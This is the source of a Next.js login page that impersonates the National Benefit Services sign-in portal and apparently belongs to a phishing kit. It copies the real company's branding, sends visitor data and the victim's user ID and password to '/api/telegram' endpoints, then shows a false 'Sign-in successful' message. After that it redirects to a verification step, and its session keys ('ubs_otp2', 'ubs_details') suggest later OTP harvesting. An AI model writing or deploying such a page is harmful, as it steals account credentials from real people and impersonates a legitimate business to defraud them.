"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<{
    userid?: string;
    password?: string;
  }>({});
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 2800);
  };

  const clearErr = (fieldId: string) => {
    setFieldErrors((prev) => ({
      ...prev,
      [fieldId]: undefined,
    }));
  };

  const validate = (): boolean => {
    let ok = true;
    const errors: typeof fieldErrors = {};

    if (!username.trim()) {
      errors.userid = "Please enter your User ID.";
      ok = false;
    }
    if (!password) {
      errors.password = "Please enter your Password.";
      ok = false;
    }

    setFieldErrors(errors);
    return ok;
  };

  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    
    if (isLoginLoading) return;

    if (!validate()) return;

    if (
      process.env.NODE_ENV !== "production" &&
      honeypot.trim() !== ""
    ) {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }

    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });

      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      showToast("Sign-in successful — welcome!");

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 1800);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <>
      <style>{`
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
          font-family: 'Open Sans', Arial, sans-serif;
          background: #fff;
          color: #333;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
        }

        /* ══ TOP NAV ══ */
        .topnav {
          background: #fff;
          border-bottom: 1px solid #ddd;
          padding: 8px 20px;
          display: flex;
          align-items: center;
          gap: 24px;
        }

        /* NBS logo */
        .nbs-logo {
          display: flex;
          align-items: flex-end;
          gap: 6px;
          text-decoration: none;
          flex-shrink: 0;
          line-height: 1;
        }
        .nbs-icon-wrap {
          display: flex;
          flex-direction: column;
          align-items: flex-start;
        }

        /* Contact info */
        .contact-block {
          display: flex;
          flex-direction: column;
          gap: 2px;
          font-size: 0.78rem;
          color: #444;
        }
        .contact-row {
          display: flex;
          align-items: center;
          gap: 5px;
        }
        .contact-row svg { flex-shrink: 0; color: #666; }

        /* Login label */
        .nav-login-label {
          font-size: 1.25rem;
          font-weight: 300;
          color: #333;
          margin-left: 4px;
        }

        /* ══ MAIN ══ */
        .main {
          flex: 1;
          display: flex;
          flex-direction: column;
          align-items: center;
          padding: 36px 20px 60px;
        }

        .lock-wrap { margin-bottom: 14px; }

        .privacy-note {
          font-size: 0.8125rem;
          color: #555;
          text-align: center;
          max-width: 340px;
          line-height: 1.55;
          margin-bottom: 18px;
        }

        .signin-heading {
          font-size: 1rem;
          font-weight: 400;
          color: #333;
          margin-bottom: 22px;
        }

        /* ══ FORM ══ */
        form { width: 100%; max-width: 420px; }

        .field-group { margin-bottom: 18px; }

        .field-label {
          font-size: 0.8125rem;
          color: #444;
          margin-bottom: 5px;
          display: flex;
          align-items: center;
          gap: 3px;
        }
        .req { color: #c0392b; font-size: 0.8rem; }

        .field-group input[type="text"],
        .field-group input[type="password"] {
          width: 100%;
          height: 36px;
          border: 1px solid #aaa;
          border-radius: 2px;
          padding: 0 10px;
          font-size: 0.875rem;
          font-family: 'Open Sans', sans-serif;
          color: #333;
          outline: none;
          background: #f0f4fa;
          transition: border-color 0.15s, box-shadow 0.15s;
        }
        .field-group input:focus {
          border-color: #3b5fa0;
          box-shadow: 0 0 0 2px rgba(59,95,160,0.13);
          background: #fff;
        }
        .field-group.has-error input { border-color: #c0392b; }

        .field-help { font-size: 0.75rem; color: #555; margin-top: 5px; }
        .field-help a { color: #3b5fa0; text-decoration: none; }
        .field-help a:hover { text-decoration: underline; }

        .err-msg {
          display: none;
          font-size: 0.72rem;
          color: #c0392b;
          margin-top: 4px;
        }
        .field-group.has-error .err-msg { display: block; }

        /* ══ SIGN IN BUTTON ══ */
        .btn-signin {
          background: #3b5fa0;
          color: #fff;
          border: none;
          border-radius: 3px;
          padding: 0 22px;
          height: 40px;
          font-size: 0.875rem;
          font-weight: 600;
          font-family: 'Open Sans', sans-serif;
          letter-spacing: 0.03em;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 18px;
          transition: background 0.15s, transform 0.08s;
        }
        .btn-signin:hover { background: #2e4d87; }
        .btn-signin:active { transform: scale(0.99); }
        .btn-signin:disabled { opacity: 0.65; cursor: not-allowed; }

        /* spinner */
        @keyframes spin { to { transform: rotate(360deg); } }
        .spin-ring {
          display: none;
          width: 14px; height: 14px;
          border: 2px solid rgba(255,255,255,0.35);
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.65s linear infinite;
        }

        .no-account-text { font-size: 0.8rem; color: #555; margin-bottom: 8px; }

        /* ══ REGISTER BUTTON ══ */
        .btn-register {
          background: #2b2b2b;
          color: #fff;
          border: none;
          border-radius: 3px;
          padding: 0 22px;
          height: 40px;
          font-size: 0.875rem;
          font-weight: 600;
          font-family: 'Open Sans', sans-serif;
          letter-spacing: 0.03em;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 10px;
          transition: background 0.15s;
        }
        .btn-register:hover { background: #444; }

        /* ══ FOOTER ══ */
        footer {
          background: #e0e0e0;
          padding: 22px 20px 16px;
          text-align: center;
        }
        .footer-links {
          display: flex;
          justify-content: center;
          gap: 32px;
          margin-bottom: 8px;
        }
        .footer-links a {
          font-size: 0.75rem;
          color: #444;
          text-decoration: none;
          letter-spacing: 0.04em;
          font-weight: 600;
          text-transform: uppercase;
        }
        .footer-links a:hover { text-decoration: underline; }
        .footer-copy { font-size: 0.72rem; color: #666; margin-bottom: 10px; }
        .footer-sitemap a {
          font-size: 0.72rem;
          color: #555;
          text-decoration: none;
          letter-spacing: 0.06em;
          text-transform: uppercase;
        }
        .footer-sitemap a:hover { text-decoration: underline; }

        /* toast */
        #toast {
          position: fixed;
          bottom: 24px; left: 50%;
          transform: translateX(-50%) translateY(10px);
          background: #333; color: #fff;
          font-size: 0.8rem;
          font-family: 'Open Sans', sans-serif;
          padding: 9px 18px;
          border-radius: 3px;
          opacity: 0; pointer-events: none;
          transition: opacity 0.2s, transform 0.2s;
          z-index: 9999;
          white-space: nowrap;
        }
        #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

        @media (max-width: 768px) {
          .topnav {
            flex-wrap: wrap;
            gap: 12px;
            padding: 8px 16px;
          }
          .main {
            padding: 24px 16px 40px;
          }
          .contact-block {
            font-size: 0.72rem;
          }
          footer {
            padding: 16px 12px 12px;
          }
          .footer-links {
            gap: 16px;
          }
        }
      `}</style>

      {/* ══ TOP NAV ══ */}
      <nav className="topnav">
        {/* NBS logo */}
        <a className="nbs-logo" href="#" onClick={(e) => e.preventDefault()}>
          <svg
            width="72"
            height="44"
            viewBox="0 0 200 120"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            {/* Yellow/gold swoosh arc on top */}
            <path
              d="M10 55 Q60 5 130 30 Q160 40 190 28 Q155 55 100 48 Q55 42 10 55Z"
              fill="#f5c400"
            />
            {/* "nbs" grey letterforms */}
            <text
              x="0"
              y="105"
              fontFamily="Arial,sans-serif"
              fontSize="72"
              fontWeight="700"
              fill="#6b6b6b"
              letterSpacing="-2"
            >
              nbs
            </text>
            {/* Small stacked text right of nbs */}
            <text
              x="148"
              y="80"
              fontFamily="Arial,sans-serif"
              fontSize="16"
              fill="#6b6b6b"
            >
              national
            </text>
            <text
              x="148"
              y="97"
              fontFamily="Arial,sans-serif"
              fontSize="16"
              fill="#6b6b6b"
            >
              benefit
            </text>
            <text
              x="148"
              y="114"
              fontFamily="Arial,sans-serif"
              fontSize="16"
              fill="#6b6b6b"
            >
              services
            </text>
            {/* TM mark */}
            <text
              x="141"
              y="108"
              fontFamily="Arial,sans-serif"
              fontSize="11"
              fill="#6b6b6b"
            >
              ™
            </text>
          </svg>
        </a>

        {/* Contact info */}
        <div className="contact-block">
          <div className="contact-row">
            <svg
              width="12"
              height="12"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.01 1.18 2 2 0 012 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14z" />
            </svg>
            855-399-3035
          </div>
          <div className="contact-row">
            <svg
              width="12"
              height="12"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
              <polyline points="22,6 12,13 2,6" />
            </svg>
            service@nbsbenefits.com
          </div>
        </div>

        <span className="nav-login-label">Login</span>
      </nav>

      {/* ══ MAIN ══ */}
      <div className="main">
        <div className="lock-wrap">
          <svg
            width="44"
            height="44"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#555"
            strokeWidth="1.3"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0110 0v4" />
            <circle cx="12" cy="16" r="1" fill="#555" stroke="none" />
          </svg>
        </div>

        <p className="privacy-note">
          We will maintain the confidentiality of your personal information in
          accordance with our privacy policy.
        </p>

        <p className="signin-heading">Sign in</p>

        <form id="login-form" noValidate onSubmit={handleSignIn}>
          {/* UserId */}
          <div
            className={`field-group ${fieldErrors.userid ? "has-error" : ""}`}
            id="fg-user"
          >
            <div className="field-label">
              UserId <span className="req">*</span>
            </div>
            <input
              type="text"
              id="userid"
              autoComplete="username"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                clearErr("userid");
              }}
            />
            <div className="field-help">
              Forgot your Username?{" "}
              <a href="#" onClick={(e) => e.preventDefault()}>
                Let us help
              </a>
            </div>
            <div className="err-msg">
              {fieldErrors.userid || "Please enter your User ID."}
            </div>
          </div>

          {/* Password */}
          <div
            className={`field-group ${fieldErrors.password ? "has-error" : ""}`}
            id="fg-pwd"
          >
            <div className="field-label">
              Password <span className="req">*</span>
            </div>
            <input
              type="password"
              id="password"
              autoComplete="current-password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                clearErr("password");
              }}
            />
            <div className="field-help">
              Forgot your Password?{" "}
              <a href="#" onClick={(e) => e.preventDefault()}>
                Let us help
              </a>
            </div>
            <div className="err-msg">
              {fieldErrors.password || "Please enter your Password."}
            </div>
          </div>

          {/* Honeypot */}
          <input
            type="text"
            name="website"
            value={honeypot}
            onChange={(e) => setHoneypot(e.target.value)}
            style={{ display: "none" }}
            autoComplete="off"
          />

          {/* Sign In */}
          <button type="submit" className="btn-signin" id="signin-btn">
            <svg
              id="signin-check"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="white"
              strokeWidth="3"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <polyline points="20 6 9 17 4 12" />
            </svg>
            <div className="spin-ring" id="signin-spin"></div>
            <span id="signin-label">{isLoginLoading ? "Signing in…" : "Sign In"}</span>
          </button>

          {/* Register */}
          <p className="no-account-text">Don't have an account?</p>
          <button
            type="button"
            className="btn-register"
            onClick={() => showToast("Opening registration…")}
          >
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="white"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
              <circle cx="9" cy="7" r="4" />
              <line x1="19" y1="8" x2="19" y2="14" />
              <line x1="22" y1="11" x2="16" y2="11" />
            </svg>
            Register
          </button>

          {loginError && (
            <p style={{ color: "#c0392b", fontSize: "0.72rem", marginTop: "4px" }}>
              {loginError}
            </p>
          )}
        </form>
      </div>

      {/* ══ FOOTER ══ */}
      <footer>
        <div className="footer-links">
          <a href="#" onClick={(e) => e.preventDefault()}>
            ABOUT US
          </a>
          <a href="#" onClick={(e) => e.preventDefault()}>
            TERMS OF USE
          </a>
          <a href="#" onClick={(e) => e.preventDefault()}>
            PRIVACY POLICY
          </a>
        </div>
        <p className="footer-copy">
          Copyright © 2020 National Benefit Services, LLC. All Rights Reserved.
        </p>
        <div className="footer-sitemap">
          <a href="#" onClick={(e) => e.preventDefault()}>
            SITE MAP
          </a>
        </div>
      </footer>

      {/* Toast */}
      <div
        id="toast"
        className={toastMessage ? "show" : ""}
        style={{ display: toastMessage ? "block" : "none" }}
      >
        {toastMessage}
      </div>
    </>
  );
}
